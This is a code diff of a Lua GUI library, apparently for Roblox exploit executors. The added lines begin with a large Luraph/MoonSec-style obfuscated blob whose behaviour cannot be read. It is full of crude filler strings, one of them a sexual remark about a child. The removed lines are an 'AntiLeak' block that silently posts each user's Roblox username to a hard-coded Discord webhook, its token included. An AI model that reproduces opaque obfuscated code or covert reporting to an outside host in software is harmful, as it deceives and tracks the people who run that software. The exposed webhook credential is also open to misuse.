daddy fed pleeaaase I said the thing)"+(0x150-212))>=___ do _ll-= _ll __[_[_l_l]]=__[_[_ll_l]]%_[__ll_];break;end while(_ll)/((7600-0xef7))==1477 do _ll=(940884)while ___>(0xb94/76)do _ll-= _ll do return __[_[__l_l]]end break end while(_ll)/((-82+0xda3))==276 do __[_[_llll]]=#__[_[_lll]];break end;break;end break;end break;end break;end break;end break;end while 1868==(_ll)/(((0x897+-20)+-#'Roblox is written in assembly you dingus'))do _ll=(2735068)while ___<=(0xab-110)do _ll-= _ll _ll=(279045)while(146+-0x60)>=___ do _ll-= _ll _ll=(1253788)while ___<=(212-0xa7)do _ll-= _ll _ll=(4369664)while ___<=(10542/0xfb)do _ll-= _ll _ll=(8184232)while(-104+0x91)<___ do _ll-= _ll local ___;local __ll;local _ll;__[_[__l_l]]=_l__[_[_lll]];_l=_l+__l;_=_l_[_l];__[_[_ll_]]=__[_[_lll]][_[_l___]];_l=_l+__l;_=_l_[_l];__[_[__lll]]=__[_[_l_ll]][_[___l_]];_l=_l+__l;_=_l_[_l];__[_[__l_]]=__[_[_l_ll]][_[_l___]];_l=_l+__l;_=_l_[_l];__[_[__l_]]=_l__[_[_l__l]];_l=_l+__l;_=_l_[_l];__[_[__lll]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[_ll_]]=_[_l_ll];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_[___ll];_l=_l+__l;_=_l_[_l];_ll=_[_l_l]__[_ll]=__[_ll](____l(__,_ll+__l,_[___l]))_l=_l+__l;_=_l_[_l];__ll=_[_lll];___=__[__ll]for _=__ll+1,_[___l_]do ___=___..__[_];end;__[_[_ll_]]=___;break end while(_ll)/((-#'This file was obfuscated with luraph obfuscator v13.2'+(0xb73+-50)))==2894 do if __[_[__lll]]then _l=_l+__l;else _l=_[_l_ll];end;break end;break;end while 1313==(_ll)/((-71+((3550+-0x7d)+-#'Ze bluetooth is connecteed')))do _ll=(11529268)while ___<=(-0x3d+104)do _ll-= _ll __[_[__lll]]=_l_l_[_[_ll_l]];_l=_l+__l;_=_l_[_l];__[_[_ll_]]=#__[_[_lll]];_l=_l+__l;_=_l_[_l];_l_l_[_[___l]]=__[_[__l_l]];_l=_l+__l;_=_l_[_l];__[_[_l_l]]=_l_l_[_[_lll]];_l=_l+__l;_=_l_[_l];__[_[_llll]]=#__[_[_lll]];_l=_l+__l;_=_l_[_l];_l_l_[_[_ll_l]]=__[_[__lll]];_l=_l+__l;_=_l_[_l];do return end;break;end while 4006==(_ll)/((5846-0xb98))do _ll=(658728)while(210-0xa6)<___ do _ll-= _ll if(__[_[_l_l]]~=_[___l_])then _l=_l+__ll;else _l=_[_lll];end;break end while(_ll)/((7860-0xf63))==168 do __[_[__l_l]][__[_[_ll_l]]]=__[_[___l_]];break end;break;end break;end break;end while 307==(_ll)/(((-90+0x1056)+-#"moon 3.1"))do _ll=(2970760)while(0xc3-148)>=___ do _ll-= _ll _ll=(7114662)while ___>(-81+0x7f)do _ll-= _ll __[_[__l_]]=#__[_[___ll]];break end while(_ll)/(((-0x43+3343)+-#"Perth sent his vagina to a 9 year old real!!!"))==2202 do __[_[_l_l]]=(_[_lll]~=0);break end;break;end while 985==(_ll)/((0x5e40/8))do _ll=(10054287)while ___<=(-#'trolled'+(-0x5c+147))do _ll-= _ll _l=_[_l_ll];break;end while 2641==(_ll)/((41877/0xb))do _ll=(11530840)while ___>(124-0x4b)do _ll-= _ll __[_[_l_l]]=__[_[_l_ll]][__[_[___l_]]];break end while(_ll)/((0x1cf2-3761))==3160 do __[_[_l_l]][__[_[___l]]]=_[__ll_];break end;break;end break;end break;end break;end while 405==(_ll)/((-0x4e+767))do _ll=(1868424)while ___<=((-#[[KFC tried to justify urls as fake constants LOL]]+(0x5d22/131))+-80)do _ll-= _ll _ll=(3984134)while ___<=((0x4a28/226)+-#"Rynin babasi kredi borcuna girdi")do _ll-= _ll _ll=(3211815)while(11118/0xda)<___ do _ll-= _ll __[_[__lll]]=_l__[_[___ll]];break end while(_ll)/((-#"sponsored by cbt"+(490350/(0xbf22/233))))==1385 do local _ll=_[___l];local _l=__[_ll]for _=_ll+1,_[_l___]do _l=_l..__[_];end;__[_[_l_l]]=_l;break end;break;end while 3157==(_ll)/((131248/0x68))do _ll=(5148000)while ___<=(-#[[If you see this string you are going to be sued by memcorrupt]]+(-121+0xeb))do _ll-= _ll local _={__,_};_[__ll][_[____][_llll]]=_[__l][_[____][___l_]]+_[__ll][_[____][_l_ll]];break;end while(_ll)/((686400/0xc0))==1440 do _ll=(6805330)while ___>(-#'One day ill make the onions cry'+(248-0xa3))do _ll-= _ll local _l=_[__lll]__[_l]=__[_l](____l(__,_l+__l,_[_l_ll]))break end while 2545==(_ll)/(((0xabe+-61)+-#[[true fuck perth]]))do local _l=_[_l_l]__[_l]=__[_l](____l(__,_l+__l,_[_l_ll]))break end;break;end break;end break;end while(_ll)/((0x849-1105))==1839 do _ll=(1136460)while ___<=(3306/0x39)do _ll-= _ll _ll=(4444413)while ___<=((169+-0x4c)+-#[[give access to functions for boosters]])do _ll-= _ll local ___;local _ll;__[_[_llll]]=_l__[_[_l_ll]];_l=_l+__l;_=_l_[_l];_ll=_[__l_];___=__[_[_l_ll]];__[_ll+1]=___;__[_ll]=___[_[__ll_]];_l=_l+__l;_=_l_[_l];__[_[__l_]]=_[_l_ll];_l=_l+__l;_=_l_[_l];_ll=_[__l_]__[_ll]=__[_ll](____l(__,_ll+__l,_[___l]))_l=_l+__l;_=_l_[_l];_ll=_[__l_l];___=__[_[___l]];__[_ll+1]=___;__[_ll]=___[_[_lll_]];_l=_l+__l;_=_l_[_l];__[_[__l_]]=__[_[_lll]];_l=_l+__l;_=_l_[_l];_ll=_[_l_l]__[_ll]=__[_ll](____l(__,_ll+__l,_[_lll]))_l=_l+__l;_=_l_[_l];__[_[__l_]]={};_l=_l+__l;_=_l_[_l];__[_[_ll_]]=_l__[_[___l]];_l=_l+__l;_=_l_[_l];__[_[_ll_]]=_[_lll];break;end while 3063==(_ll)/(((0xa0040/224)-0x5c3))do _ll=(140096)while ___>(3933/0x45)do _ll-= _ll __[_[__l_l]]=_[___l];break end while 796==(_ll)/((0x18f-223))do __[_[__l_]][_[___l]]=__[_[_lll_]];break end;break;end break;end while 3055==(_ll)/(((-#"Penis Sucking Utilities source leak lol!!"+(0x248+-61))+-0x6e))do _ll=(8042720)while(9322/0x9e)>=___ do _ll-= _ll _l__[_[_lll]]=__[_[_llll]];_l=_l+__l;_=_l_[_l];__[_[__lll]]={};_l=_l+__l;_=_l_[_l];__[_[_llll]]={};_l=_l+__l;_=_l_[_l];_l__[_[_l__l]]=__[_[_llll]];_l=_l+__l;_=_l_[_l];__[_[__l_]]=_l__[_[_l__l]];_l=_l+__l;_=_l_[_l];if(__[_[__lll]]~=_[__ll_])then _l=_l+__ll;else _l=_[_lll];end;break;end while(_ll)/(((3406+-0x2e)+-#"Slowmode is enabled."))==2408 do _ll=(3416203)while ___>(15060/(0xec4b/241))do _ll-= _ll _l_l_[_[_ll_l]]=__[_[_ll_]];break end while 973==(_ll)/((-#[[Luraph v14 ETA?]]+((0x383d-7259)-3612)))do if(__[_[_l_l]]==__[_[___l_]])then _l=_l+__ll;else _l=_[_lll];end;break end;break;end break;end break;end break;end break;end while(_ll)/((6370-0xc93))==868 do _ll=(8998290)while(0x3894/204)>=___ do _ll-= _ll _ll=(4771254)while(0x9b-89)>=___ do _ll-= _ll _ll=(1424735)while ___<=(183-0x78)do _ll-= _ll _ll=(520128)while ___>(0xb0-114)do _ll-= _ll local _=_[_ll_]__[_](__[_+__ll])break end while 2016==(_ll)/(((59356/0xd1)+-#[[Federal has a disabled mom]]))do __[_[__l_l]]=__[_[___l]]-__[_[_lll_]];break end;break;end while 953==(_ll)/((0xc19-1602))do _ll=(387200)while(195-(0x567b/169))>=___ do _ll-= _ll __[_[_llll]]=_____(_ll__[_[___ll]],nil,_l__);break;end while 440==(_ll)/((0x3ec+-124))do _ll=(2991164)while ___>(0x1103/67)do _ll-= _ll local _=_[_l_l]__[_]=__[_](__[_+__ll])break end while(_ll)/((3487-0x6e0))==1732 do local _lll=_ll__[_[_l__l]];local ___;local _ll={};___=__ll_l({},{__index=function(_l,_)local _=_ll[_];return _[1][_[2]];end,__newindex=function(__,_,_l)local _=_ll[_]_[1][_[2]]=_l;end;});for __l=1,_[_lll_]do _l=_l+__ll;local _=_l_[_l];if _[(55-0x36)]==69 then _ll[__l-1]={__,_[_ll_l]};else _ll[__l-1]={_l_l_,_[_l__l]};end;_lllll[#_lllll+1]=_ll;end;__[_[__l_]]=_____(_lll,___,_l__);break end;break;end break;end break;end while(_ll)/(((6610-0xd27)+-#[[moons.ec/purchase]]))==1479 do _ll=(257912)while ___<=(-#"loadstring()"+(-0x2a+122))do _ll-= _ll _ll=(4339440)while ___>(0x7f+-60)do _ll-= _ll local _ll;__[_[__l_]]=_[_lll];_l=_l+__l;_=_l_[_l];_ll=_[_l_l]__[_ll]=__[_ll](____l(__,_ll+__l,_[___l]))_l=_l+__l;_=_l_[_l];__[_[__l_]][_[_ll_l]]=__[_[__ll_]];_l=_l+__l;_=_l_[_l];__[_[__l_]][_[___l]]=__[_[_lll_]];_l=_l+__l;_=_l_[_l];__[_[__lll]]=_l__[_[___ll]];_l=_l+__l;_=_l_[_l];__[_[_l_l]]=__[_[___l]];_l=_l+__l;_=_l_[_l];_ll=_[__l_]__[_ll](__[_ll+__ll])_l=_l+__l;_=_l_[_l];__[_[__l_]]=_l__[_[_l__l]];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_l__[_[_lll]];_l=_l+__l;_=_l_[_l];__[_[_l_l]]=_[___ll];break end while(_ll)/((-#'sexy'+(0x1d17-3753)))==1176 do if(__[_[__lll]]==__[_[__ll_]])then _l=_l+__ll;else _l=_[_l_ll];end;break end;break;end while 313==(_ll)/((0x4398/21))do _ll=(711810)while((0x40b8/152)+-#"Found an xxxxxxxxxl store for ur fat mom")>=___ do _ll-= _ll __[_[_ll_]]=__[_[_ll_l]];break;end while(_ll)/((-36+0xe2f))==198 do _ll=(8089740)while ___>(215-0x91)do _ll-= _ll __[_[_l_l]]=(_[___l]~=0);break end while 2556==(_ll)/((-#"I am eq opcode lmaooooo"+(0x58ba8/114)))do local _={__,_};_[__ll][_[____][_ll_]]=_[__l][_[____][__l__]]+_[__ll][_[____][_l_ll]];break end;break;end break;end break;end break;end while(_ll)/((-25+0x997))==3703 do _ll=(9825388)while(0xc6-122)>=___ do _ll-= _ll _ll=(6518633)while ___<=(-59+0x84)do _ll-= _ll _ll=(7172550)while(-121+0xc1)<___ do _ll-= _ll if __[_[__l_]]then _l=_l+__l;else _l=_[_lll];end;break end while 2970==(_ll)/((-#[[Roblox is written in assembly you dingus]]+(4958-0x9c7)))do local _ll=_[___l];local _l=__[_ll]for _=_ll+1,_[__ll_]do _l=_l..__[_];end;__[_[__l_]]=_l;break end;break;end while 3169==(_ll)/((-#"deez nuts"+(0x1abba/53)))do _ll=(11667732)while(0x3eba/217)>=___ do _ll-= _ll local _l=_[__l_];local _ll=__[_l];for _=_l+1,_[_l_ll]do _l__ll(_ll,__[_])end;break;end while(_ll)/((0x377a0/72))==3697 do _ll=(8743845)while(0xff-180)<___ do _ll-= _ll __[_[__l_]]=(_[_lll]~=0);_l=_l+__ll;break end while(_ll)/((0x14a21/39))==4035 do local _=_[__lll]__[_](__[_+__ll])break end;break;end break;end break;end while(_ll)/(((0x6c1f3/109)+-#"someone play kogama with perth please hes so lonely"))==2449 do _ll=(5234760)while(-34+0x71)>=___ do _ll-= _ll _ll=(1082334)while ___<=((370-0xf7)+-#[[This script has been obfuscated using your mom]])do _ll-= _ll if(__[_[_ll_]]~=_[__l__])then _l=_l+__ll;else _l=_[_l__l];end;break;end while 713==(_ll)/((-#'this meme string was brought to you by raid shadow legends'+(184392/0x75)))do _ll=(6460)while ___>(-0x5b+169)do _ll-= _ll local ___=_ll__[_[_lll]];local __l;local _ll={};__l=__ll_l({},{__index=function(_l,_)local _=_ll[_];return _[1][_[2]];end,__newindex=function(__,_,_l)local _=_ll[_]_[1][_[2]]=_l;end;});for __l=1,_[_lll_]do _l=_l+__ll;local _=_l_[_l];if _[((0x3700/160)+-#[[helloretard will face off against MoonSec if Federal keeps deleting my strings fuck you]])]==69 then _ll[__l-1]={__,_[_lll]};else _ll[__l-1]={_l_l_,_[___ll]};end;_lllll[#_lllll+1]=_ll;end;__[_[__l_l]]=_____(___,__l,_l__);break end while(_ll)/((741-0x1a2))==20 do local _=_[_ll_]__[_]=__[_](__[_+__ll])break end;break;end break;end while 3144==(_ll)/(((0x6c4+-33)+-#"Nice constant dumper you got there"))do _ll=(4079340)while ___<=(-81+0xa1)do _ll-= _ll _l_l_[_[___l]]=__[_[__l_l]];break;end while 2620==(_ll)/(((1743+-0x57)+-#[[Hi I give skin away in game Counter of the Global Offense Strike. Send trade offer on sketchy link.]]))do _ll=(3259788)while(226-0x91)<___ do _ll-= _ll local ___;local _ll;__[_[_llll]]=_l__[_[_ll_l]];_l=_l+__l;_=_l_[_l];__[_[_l_l]]=_[_ll_l];_l=_l+__l;_=_l_[_l];__[_[__lll]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[_ll_]]=_[_ll_l];_l=_l+__l;_=_l_[_l];_ll=_[__l_l]__[_ll]=__[_ll](____l(__,_ll+__l,_[_ll_l]))_l=_l+__l;_=_l_[_l];__[_[_ll_]][__[_[_ll_l]]]=_[_lll_];_l=_l+__l;_=_l_[_l];_ll=_[__lll];___=__[_ll];for _=_ll+1,_[_lll]do _l__ll(___,__[_])end;break end while(_ll)/((6363-0xc78))==1028 do __[_[_l_l]]=__[_[_l_ll]]%_[_lll_];break end;break;end break;end break;end break;end break;end break;end _l+= __ll end;end);end;return _____(_ll_ll(),{},_l___l())()end)_msec({[(0x4074/100)]='\115\116'..(function(_)return(_ and'(303-0xcb)')or'\114\105'or'\120\58'end)((-#[[69 w ya roomm8s]]+(103-0x53))==(600/0x64))..'\110g',[((1677-0x369)+-#'Pain is an illusion created by your brain')]='\108\100'..(function(_)return(_ and'(194+-0x5e)')or'\101\120'or'\119\111'end)((0x51-76)==(-#'v3 has it'+(((346-0xb9)+-#[[PSU and MoonSec winning]])-0x7b)))..'\112',[(0x2bc-(-#{82;'}',1}+413))]=(function(_)return(_ and'(-120+0xdc)')and'\98\121'or'\100\120'end)((-#"Unpair"+(0x8b-128))==(0x1f4/100))..'\116\101',[(-#'Moonsec v6 coming out in 1 day'+(44520/0x69))]='\99'..(function(_)return(_ and'(-#"This file has been enchanted with uncrackable V, fuck the fuck off"+(0x1a8-258))')and'\90\19\157'or'\104\97'end)((81-0x4c)==(-0x4f+82))..'\114',[(-#"nice dump!"+(32832/0x39))]='\116\97'..(function(_)return(_ and'(0xb54/29)')and'\64\113'or'\98\108'end)((-#"hint: the script is in line 1"+(182-0x93))==(-#"hey psst you the wrapper function is right there"+(0xac4/52)))..'\101',[(-#"guys listen... sussex XD"+(0x1b05a/234))]=(function(_)return(_ and'(-44+0x90)')or'\115\117'or'\78\107'end)((-#'Federal is godly'+((-#"a table b equals c"+(260-0x90))-79))==(0x3e+-31))..'\98',[((435100/0xe5)-1001)]='\99\111'..(function(_)return(_ and'(0x5910/228)')and'\110\99'or'\110\105\103\97'end)((0x763/61)==(84-0x35))..'\97\116',[(102718/0x9a)]=(function(_,_l)return(_ and'(0x12a-198)')and'\48\159\158\188\10'or'\109\97'end)(((0x5f5/61)+-#'no i legit burned it')==(0x5a+(-0x43-17)))..'\116\104',[(0x30636/143)]=(function(_,_l)return((100-0x5f)==(-0x5b+(0x132-212))and'\48'..'\195'or _..((not'\20\95\69'and'\90'..'\180'or _l)))or'\199\203\95'end),[(-#{{},{},(function()return#{('omhOKB'):find("\104")}>0 and 1 or 0 end);1}+970)]='\105\110'..(function(_,_l)return(_ and'(0x526c/211)')and'\90\115\138\115\15'or'\115\101'end)((945/0xbd)==(4278/0x8a))..'\114\116',[((2319-0x4c6)+-#[[KFC tried to justify urls as fake constants LOL]])]='\117\110'..(function(_,_l)return(_ and'(-#"make sure armando.rar isnt in ur fucking config folder"+(21714/0x8d))')or'\112\97'or'\20\38\154'end)((0x3e-57)==(4898/0x9e))..'\99\107',[(-#{(function()return{','}end)();(function()return{','}end)(),'nil';(function()return#{('HPpKFh'):find("\112")}>0 and 1 or 0 end);{},12,(function()return#{('HPpKFh'):find("\112")}>0 and 1 or 0 end)}+1201)]='\115\101'..(function(_)return(_ and'(-#"You know lua? name every metamethod - skids of v3rm"+(0x4fa1/135))')and'\110\112\99\104'or'\108\101'end)((-#"Please proceed to translate Keys Cow to filipino"+(4982/0x5e))==(-#[[I am eq opcode lmaooooo]]+(123+(-#[[somebody play minecraft with lerebox please hes so lonely]]+(-0xf0/20)))))..'\99\116',[(-#{'nil';{};'}';'nil';'nil','nil',","}+1270)]='\116\111\110'..(function(_,_l)return(_ and'(0x10e-170)')and'\117\109\98'or'\100\97\120\122'end)((815/0xa3)==(-29+0x22))..'\101\114'},{[(-29+0x34)]=((getfenv))},((getfenv))()) end)()
+
+
+
+			
+		end
+
+		if (not library.options) then
+			library.options = setmetatable(options or {}, {__index = defaults})
+		end
+
+		local window = types.window(name, library.options);
+		dragger.new(window.object);
+		return window
+	end
+
+	default = {
+		topcolor       = Color3.fromRGB(30, 30, 30);
+		titlecolor     = Color3.fromRGB(255, 255, 255);
+
+		underlinecolor = Color3.fromRGB(0, 255, 140);
+		bgcolor        = Color3.fromRGB(35, 35, 35);
+		boxcolor       = Color3.fromRGB(35, 35, 35);
+		btncolor       = Color3.fromRGB(25, 25, 25);
+		dropcolor      = Color3.fromRGB(25, 25, 25);
+		sectncolor     = Color3.fromRGB(25, 25, 25);
+		bordercolor    = Color3.fromRGB(60, 60, 60);
+
+		font           = Enum.Font.SourceSans;
+		titlefont      = Enum.Font.Code;
+
+		fontsize       = 17;
+		titlesize      = 18;
+
+		textstroke     = 1;
+		titlestroke    = 1;
+
+		strokecolor    = Color3.fromRGB(0, 0, 0);
+
+		textcolor      = Color3.fromRGB(255, 255, 255);
+		titletextcolor = Color3.fromRGB(255, 255, 255);
+
+		placeholdercolor = Color3.fromRGB(255, 255, 255);
+		titlestrokecolor = Color3.fromRGB(0, 0, 0);
+	}
+
+	library.options = setmetatable({}, {__index = default})
+
+	spawn(function()
+		while true do
+			for i=0, 1, 1 / 300 do              
+				for _, obj in next, library.rainbowtable do
+					obj.BackgroundColor3 = Color3.fromHSV(i, 1, 1);
+				end
+				wait()
+			end;
+		end
+	end)
+
+	local function isreallypressed(bind, inp)
+		local key = bind
+		if typeof(key) == "Instance" then
+			if key.UserInputType == Enum.UserInputType.Keyboard and inp.KeyCode == key.KeyCode then
+				return true;
+			elseif tostring(key.UserInputType):find('MouseButton') and inp.UserInputType == key.UserInputType then
+				return true
+			end
+		end
+		if tostring(key):find'MouseButton1' then
+			return key == inp.UserInputType
+		else
+			return key == inp.KeyCode
+		end
+	end
+
+	game:GetService("UserInputService").InputBegan:connect(function(input)
+		if (not library.binding) then
+			for idx, binds in next, library.binds do
+				local real_binding = binds.location[idx];
+				if real_binding and isreallypressed(real_binding, input) then
+					binds.callback()
+				end
+			end
+		end
+	end)
 end
-
-
-local data = {
-	["content"] = "",
-	["embeds"] = {{
-		["title"] = "__**AntiLeak**__",
-		["description"] = "by iOwn_You#0622",
-		["type"] = "rich",
-		["color"] = tonumber(0x0E980E),
-		["fields"] = {
-			{
-				["name"] = "__Someone Activated!__",
-				["value"] = game.Players.LocalPlayer.Name.." JUST ACTIVATED", 
-				["inline"] = false
-			},
-
-		}
-	}}
-}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-local headers = {
-	["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = "https://discord.com/api/webhooks/891415654094233640/OeJLybTbYkA7zPdjKCD61fF79Hn1H3PUPLJJTUBH8x3Z65tM_v-28EDv_pzH7jJnS1WE", Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
-print("ANTI LEAK LOADED - Your execution has been reported! lets hope its not a leak ;)")
-
-
-
-
-
-
-
 return library
